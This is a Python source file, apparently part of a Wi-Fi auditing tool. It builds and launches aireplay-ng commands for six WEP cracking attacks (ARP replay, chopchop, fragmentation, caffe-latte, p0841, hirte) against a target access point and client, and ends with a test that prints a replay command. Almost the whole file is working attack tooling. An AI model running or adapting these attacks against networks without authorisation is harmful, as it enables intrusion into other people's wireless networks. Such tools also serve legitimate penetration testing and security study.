#!/usr/bin/python

from Configuration import Configuration
from Process import Process

class WEPAttackType(object):
    ''' Enumeration of different WEP attack types '''
    replay = 0
    chopchop = 1
    fragmentation = 2
    caffelatte = 3
    p0841 = 4
    hirte = 5


class Aireplay(object):
    def __init__(self):
        self.pid = None # Process instance for aireplay-ng
        self.attack_type = None

    def run_wep_attack(self, target, attack_type):
        ''' Starts aireplay process '''
        cmd = self.get_aireplay_command(target, attack_type)
        if self.pid and self.pid.poll() != None:
            # Aireplay is already running, kill it
            self.pid.interrupt()
        self.pid = Process(cmd, devnull=True)

    def stop_wep_attack(self):
        ''' Stops aireplay process '''
        if self.pid and self.pid.poll() != None:
            self.pid.interrupt()

    def get_aireplay_command(self, target, attack_type):
        ''' Generates aireplay command based on target and attack type '''
        cmd = ['aireplay-ng']
        cmd.append('--ignore-negative-one')
        client_mac = None
        if len(target.clients) > 0:
            client_mac = target.clients[0].station

        if attack_type == WEPAttackType.replay:
            cmd.append('--arpreplay')
            cmd.extend(['-b', target.bssid])
            cmd.extend(['-x', str(Configuration.wep_pps)])
            if client_mac:
                cmd.extend(['-h', client_mac])

        elif attack_type == WEPAttackType.chopchop:
            cmd.append('--chopchop')
            cmd.extend(['-b', target.bssid])
            cmd.extend(['-x', str(Configuration.wep_pps)])
            cmd.extend(['-m', '60']) # Minimum packet length (bytes)
            cmd.extend(['-n', '82']) # Maximum packet length
            cmd.extend(['-F'])       # Automatically choose first packet
            if client_mac:
                cmd.extend(['-h', client_mac])

        elif attack_type == WEPAttackType.fragmentation:
            cmd.append('--fragment')
            cmd.extend(['-b', target.bssid])
            cmd.extend(['-x', str(Configuration.wep_pps)])
            cmd.extend(['-m', '100']) # Minimum packet length (bytes)
            cmd.extend(['-F'])       # Automatically choose first packet
            if client_mac:
                cmd.extend(['-h', client_mac])

        elif attack_type == WEPAttackType.caffelatte:
            cmd.append('--caffe-latte')
            cmd.extend(['-b', target.bssid])
            if client_mac:
                cmd.extend(['-h', client_mac])

        elif attack_type == WEPAttackType.p0841:
            cmd.append('--interactive')
            cmd.extend(['-b', target.bssid])
            cmd.extend(['-c', 'ff:ff:ff:ff:ff:ff'])
            cmd.extend(['-t', '1'])
            cmd.extend(['-x', str(Configuration.wep_pps)])
            cmd.extend(['-F']) # Automatically choose first packet
            cmd.extend(['-p', '0841'])
            if client_mac:
                cmd.extend(['-h', client_mac])

        elif attack_type == WEPAttackType.hirte:
            if client_mac == None:
                # Unable to carry out hirte attack
                raise Exception("Client is required for hirte attack")
            cmd.append('--cfrag')
            cmd.extend(['-h', client_mac])

        cmd.append(Configuration.interface)
        return cmd


if __name__ == '__main__':
    Configuration.initialize()

    a = Aireplay()

    from Target import Target
    fields = 'AA:BB:CC:DD:EE:FF, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  1,  54, WPA2, CCMP TKIP,PSK, -58,        2,        0,   0.  0.  0.  0,   9, HOME-ABCD, '.split(',')
    t = Target(fields)

    print ' '.join(a.get_aireplay_command(t, WEPAttackType.replay))

